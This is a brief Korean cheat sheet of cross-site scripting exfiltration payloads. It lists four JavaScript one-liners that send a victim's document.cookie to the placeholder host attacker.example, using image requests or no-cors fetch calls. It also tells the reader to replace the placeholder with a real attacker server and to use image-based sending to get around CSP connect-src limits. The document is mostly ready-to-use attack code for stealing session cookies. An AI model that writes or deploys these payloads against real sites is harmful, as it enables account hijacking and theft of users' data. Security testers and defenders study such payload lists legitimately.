# XSS 외부 전송 페이로드

- XSS 실행 후 수집한 데이터를 `new Image().src`나 `fetch`(POST·`no-cors`·이중 `encodeURIComponent`)로 공격자 서버로 보내는 페이로드 모음
- `alert(document.cookie)`로 존재를 확인한 뒤 데이터를 실제로 확보하려고 외부 전송 단계로 넘어갈 때, 블라인드 XSS의 결과 회수 표준 수단으로 쓸 때
- `attacker.example`를 대상이 접근 가능한 공격자 IP로 바꿔야 하고, 수신 서버(8000 포트 등)가 요청을 기록해야 한다. CSP `connect-src` 제한이 있으면 `Image` 기반이 대안이 된다

## 개요

`<img src=x onerror="...">` 형태의 XSS에서 수집한 데이터를 공격자 서버로 보내는 JavaScript 페이로드 모음이다. `attacker.example`는 실제 공격자 서버 주소로 바꿔 사용한다.

## 외부 서버로 보내기

`alert()`는 측정이 어렵다. 공격자 서버로 결과를 보내는 형태가 더 실용적이다.

```js
new Image().src='http://attacker.example/steal?c='+encodeURIComponent(document.cookie)
```

```js
fetch('http://attacker.example/steal',{method:'POST',mode:'no-cors',body:document.cookie})
```

```js
fetch('http://attacker.example/steal?data='+encodeURIComponent(encodeURIComponent(document.cookie)))
```

```js
var img=new Image();
img.onload=function(){alert('sent')}
img.src='http://attacker.example/steal?c='+encodeURIComponent(document.cookie)
```
